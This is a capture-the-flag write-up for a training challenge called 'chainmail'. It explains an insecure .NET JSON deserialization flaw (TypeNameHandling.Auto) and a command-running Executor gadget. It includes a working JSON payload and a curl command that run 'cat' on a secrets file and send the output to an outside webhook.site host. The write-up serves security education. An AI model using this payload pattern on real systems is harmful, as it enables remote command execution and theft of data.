# chainmail

## Solution

In the home controller, we notice that the body of the request posted to the `/home/postcodes` endpoint is parsed as JSON with `TypeNameHandling.Auto`.

```csharp
Stream req = Request.Body;
string json = await new StreamReader(req).ReadToEndAsync();

var test = JsonConvert.DeserializeObject<Object>(json, new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.Auto
});
```

This opens the application to an *insecure deserialization* attack (see e.g., [here](https://medium.com/c-sharp-progarmming/stop-insecure-deserialization-with-c-6a488c95cf2f)). The flag `TypeNameHandling.Auto`, indicates to the JSON parser that the user is allowed to choose the type of the object that the data will be deserialized to.

Now, we need to can explore the codebase a bit better to see if there is any object that we can create that can help us extract the flag, stored in `/secrets/flag.txt`. Reviewing the `Utils` namespace, we come across the `Excecutor` class

```csharp
public class Executor
{
    private static readonly HttpClient client = new HttpClient();
    /*
        Runs a command with the given arguments and sends the result of that
        command to *resultUrl*, if specified.
    */
    public Executor(string cmd, string args, string? resultUrl)
    {

        ProcessStartInfo start = new ProcessStartInfo();
        start.Arguments = args;
        start.FileName = cmd;
        start.WindowStyle = ProcessWindowStyle.Hidden;
        start.RedirectStandardOutput = true;
        start.CreateNoWindow = true;

        // Run the external process & wait for it to finish
        using (Process? proc = Process.Start(start))
        {
            if (proc == null)
            {
                return;
            }
            proc.WaitForExit();

            if (!String.IsNullOrEmpty(resultUrl))
            {
                client.PostAsJsonAsync<RunResult>(resultUrl, new RunResult(){
                    Success=proc.ExitCode == 0,
                    Output=proc.StandardOutput.ReadToEnd()
                }).Wait(20 * 1000);
            }
        }

    }
}
```

which happens to run a command and send the output of the command to a specified URL.

Now, we can create a payload that creates a new instance of `Executor` that runs the command `cat` on the file `/secrets/flag.txt`. We can then receive the flag out-of-band, e.g. on [interactsh](https://app.interactsh.com/#/) or [webhook.site](https://webhook.site/). The crafted payload could be

```json
{
    "$type":"App.Utils.Executor, App",
    "cmd":"cat",
    "args": "/secrets/flag.txt",
    "resultUrl": "https://webhook.site/#!/some-uuid"
}
```

or with `curl`

```bash
curl -i -X POST -d '{ "$type":"App.Utils.Executor, App", "cmd":"cat", "args": "/secrets/flag.txt", "resultUrl": "https://webhook.site/some-uuid" }' -H "Content-Type: application/json" 'https://chainmail.origo.syndis.training/home/postcodes'
```

The out-of-band request we get back is then

```json
{
  "success": true,
  "output": "flag{J50n_S0_1nsecure_1t_Br0ke_Up_W1th_1ts_3ncrypt10n_K3ys}\n"
}
```

## Takeaway
Great care must be taken with deserialization in .NET. You can read more [here](https://medium.com/c-sharp-progarmming/stop-insecure-deserialization-with-c-6a488c95cf2f).
